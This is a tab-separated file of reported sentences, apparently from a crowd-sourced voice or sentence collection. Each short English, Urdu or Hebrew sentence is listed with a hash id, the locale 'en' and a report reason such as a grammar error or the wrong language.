sentence	sentence_id	locale	reason
I really do like green jeans though	06718d0ae3989458a08c83551cb62d259c2f820204e3fb5fd262ffd25959d772	en	issue with the sign and grammatically errors 
I do not want do dance with a boy at school. I'm lesbian!	08e55112750e014c088ffedbec5c76c04e558b4724b3202cb55cb0c45195efc3	en	grammar-or-spelling
כשר	0b51abc9198ba1c5b041e412945be2d9ae7c79d2f6ae66d93aa6f5efaf23c29e	en	grammar-or-spelling
Many business were destroyed.	db2ddc7ab58bad4ef75764893df9acb505487e5aaff71009cdb933e8a3961abd	en	grammar-or-spelling
دوسروں کی مدد کریں اور ان کی خوشیاں بڑھائیں۔
	079236c002c39faa61699198f00c77b829ff3f0e8b776806f7b82c7f42f7edd4	en	sc-different-language
. اپنے ارمغان کو پیش کریں۔
	093cbcc7b717c6a373c6f49c97c6866c260ae988b9a07906f0dd1723eac3d183	en	sc-different-language
میں نے کتاب پڑھی.
	097406d48f089036a03c3557cfe93e6a4921f9d82b7e0054e2bf380815c5d6be	en	sc-different-language
 زندگی کے تمام لحاظ سے فیصلے کو دھیان سے کریں۔
	0c9ed99ece1a05556eea55f143d8236fe35b94325a20c011f171453b7acd27d2	en	sc-different-language
وہ خواب دیکھ رہا ہے.
	0cd094e193d74597b4eb76f939fe5c66616e2d54a9c8c57d6052c8551020d8db	en	sc-different-language
سچائی کو پسند کرو.
	bf35e5a0f5316c39dbfae583888be2e082772c6cf3f06b070c8abb857bd08089	en	sc-different-language
Neuner was born in Munich.	db9ab80e15ab2f6cd103cc8da39000f9477704eefca38d909b390c387de424ee	en	difficult-pronounce
After his win in France Anthony Van Dyck was sent to race in Australia.	db7d5f14ad99151b625800072d8dff51576d67eb23145cc1122f0f2c831aac46	en	grammar-or-spelling
Allmusic critic John Bush calls "Standing in the Shadows of Love" "dramatic" and "impassioned.	dbae347cfd0f2bec2aaa40b66fb290c9da2f6397b36301091437d84380ea4fec	en	grammar-or-spelling
شفقت کا رویہ رکھیں۔

	0140579e3b61939ca98958dc6f6013a15fc6a8cb8dd51f8cb32e98046d39a940	en	different-language
Formidable was torpedoed, the first major U-boat loss of World War One.	dbbdd3acc24ab95099fbcf8a3fe2f81777890fcbb99afb3a4075a6d9fe066e3e	en	grammar-or-spelling
اس کی قیمت کیا ہے؟
